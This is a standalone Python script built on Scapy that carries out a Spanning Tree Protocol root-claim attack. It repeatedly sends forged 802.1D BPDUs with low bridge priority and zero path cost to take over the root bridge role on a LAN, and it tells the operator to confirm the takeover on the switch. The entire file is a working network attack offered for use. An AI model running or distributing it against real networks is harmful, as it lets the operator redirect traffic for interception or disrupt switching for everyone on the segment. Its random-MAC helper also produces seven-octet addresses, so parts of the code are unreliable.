#!/usr/bin/env python3

"""
STP Root Claim Attack - IEEE 802.1D Standard (Working Version)
Format identical to working version: Dot3 + LLC + STP
"""

from scapy.all import Dot3, LLC, STP, sendp, get_if_hwaddr, conf
import argparse
import random
import sys
import os
import time
import signal
from termcolor import colored
from pwn import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def handler(sig, frame):
    print(colored("\n[!] Stopped by user", 'red'))
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def get_arguments():
    parser = argparse.ArgumentParser(
        description="STP Root Claim - IEEE 802.1D Standard",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: sudo python3 stp_root.py -i eth0 -p 4096"
    )
    parser.add_argument("-i", "--interface", required=True, help="Interface (eth0, ens4)")
    parser.add_argument("-p", "--priority", type=int, default=4096, help="Root priority (default: 4096)")
    parser.add_argument("-m", "--mac", help="Custom MAC (optional)")
    parser.add_argument("-t", "--interval", type=float, default=1.0, help="Interval in seconds (default: 1)")
    return parser.parse_args()

def generate_mac():
    """Generate random MAC address"""
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255)
    )

def build_bpdu(src_mac, root_priority, root_mac, bridge_priority, bridge_mac, port_id=32769):
    """
    Build IEEE 802.1D standard BPDU
    Format: Dot3 + LLC(dsap=0x42, ssap=0x42, ctrl=0x03) + STP()
    """
    packet = (
        Dot3(dst="01:80:c2:00:00:00", src=src_mac)  # 802.3 framing, NOT Ethernet II
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)       # Standard LLC for STP
        / STP(
            proto=0,                # Protocol ID (0 = STP)
            version=0,              # Version (0 = STP, 2 = RSTP)
            bpdutype=0,             # Type 0 = Configuration BPDU
            bpduflags=0,            # Flags
            rootid=root_priority,   # Root Priority
            rootmac=root_mac,       # Root MAC
            pathcost=0,             # Root Path Cost (0 = claiming root)
            bridgeid=bridge_priority,  # Bridge Priority
            bridgemac=bridge_mac,   # Bridge MAC
            portid=port_id,         # Port ID
            age=0,                  # Message Age
            maxage=20,              # Max Age
            hellotime=2,            # Hello Time
            fwddelay=15             # Forward Delay
        )
    )
    return packet

def main():
    # Check for root privileges
    if os.geteuid() != 0:
        print(colored("[-] Error: Run with sudo", 'red'))
        sys.exit(1)
    
    args = get_arguments()
    
    # Get real MAC from interface
    try:
        real_mac = get_if_hwaddr(args.interface)
    except:
        real_mac = args.mac if args.mac else generate_mac()
    
    # MACs for attack (root = bridge = same for root claim)
    root_mac = args.mac if args.mac else generate_mac()
    bridge_mac = root_mac  # Same MAC for root and bridge (root claim)
    
    # Configure Scapy
    conf.iface = args.interface
    conf.verb = 0
    
    print(colored("="*60, 'blue'))
    print(colored("[*] STP ROOT CLAIM ATTACK - IEEE 802.1D", 'blue', attrs=['bold']))
    print(colored(f"[*] Interface: {args.interface}", 'cyan'))
    print(colored(f"[*] Real MAC: {real_mac}", 'cyan'))
    print(colored(f"[*] Fake Root/Bridge MAC: {root_mac}", 'cyan'))
    print(colored(f"[*] Root Priority: {args.priority}", 'cyan'))
    print(colored(f"[*] Interval: {args.interval}s", 'cyan'))
    print(colored("[*] Format: Dot3 + LLC(0x42,0x42,0x03) + STP", 'green'))
    print(colored("[!] Starting attack...\n", 'red', attrs=['bold']))
    
    # Build packet
    packet = build_bpdu(
        src_mac=real_mac,
        root_priority=args.priority,
        root_mac=root_mac,
        bridge_priority=args.priority,
        bridge_mac=bridge_mac,
        port_id=32769
    )
    
    # Send BPDUs
    count = 0
    p = log.progress("Sending BPDUs")
    
    try:
        while True:
            sendp(packet, iface=args.interface, verbose=False)
            count += 1
            
            if count % 10 == 0:
                p.status(f"{count} BPDUs sent")
            
            time.sleep(args.interval)
            
    except KeyboardInterrupt:
        print(colored(f"\n[+] Total sent: {count}", 'green'))
        print(colored("[!] Wait 30 seconds and verify on switch:", 'yellow'))
        print(colored("    show spanning-tree vlan 1", 'yellow'))

if __name__ == "__main__":
    main()
